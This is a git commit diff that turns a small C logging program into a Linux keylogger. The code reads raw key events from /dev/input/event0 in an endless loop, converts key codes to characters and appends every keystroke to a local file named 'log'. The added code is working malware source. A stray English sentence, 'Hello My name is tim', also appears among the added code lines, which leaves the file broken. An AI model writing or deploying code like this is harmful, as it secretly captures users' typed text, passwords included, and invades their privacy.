7d9182d57466ab57153b22d8424e8c431c657778
HaydenColling <91355627+HaydenColling@users.noreply.github.com>
2023-06-02 23:04:42 -0400

    Add files via upload

--- prog.c
+++ prog.c
@@ -3,13 +3,17 @@
 #include<unistd.h>
 #include<sys/time.h>
 #include<time.h>
+#include<string.h>
+#include<linux/input.h>
+#include<sys/stat.h>
+#include<fcntl.h>
 
 int main(int argc,char* argv[]) {
 
 	printf("***Creating log file***\n");
 
 	FILE* fp;
-	fp = fopen("log","w");
+	fp = fopen("log","a");
 	char buffer[1024];
 
 	// Get time
@@ -21,12 +25,41 @@ int main(int argc,char* argv[]) {
 	t = tv.tv_sec;
 	info = localtime(&t);
 	strftime(buffer,sizeof(buffer), "%A %B %d %I:%M %P\n",info);
-	printf("%s", buffer);
 
 	// Write start for signify beggining of log
 	// Write current time of day
 
 	fprintf(fp,"start\t",sizeof("start"));
 	fprintf(fp,buffer,sizeof(buffer));
+	int c = 0;
 
+	memset(buffer,0,sizeof(buffer));
+
+	struct input_event ev;
+	int eventFile = open("/dev/input/event0", O_RDONLY);
+	char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,.-....";
+	int j = 0;
+
+	while(1){
+		read(eventFile,&ev,sizeof(ev));
+		if ((ev.type == EV_KEY) && (ev.value == 0))
+		{
+			//printf("%c\n",map[ev.code]);
+			fflush(fp);
+			switch(ev.code)
+			{
+			case 57:
+				fprintf(fp," ");
+				break;
+			case 28:
+				fprintf(fp,"\n");
+				break;
+			default:
+				fprintf(fp,"%c",map[ev.code]);
+			}
+		}
+	}
+Hello My name is tim
+	fclose(fp);
+	printf("\nFinished\n");
 }
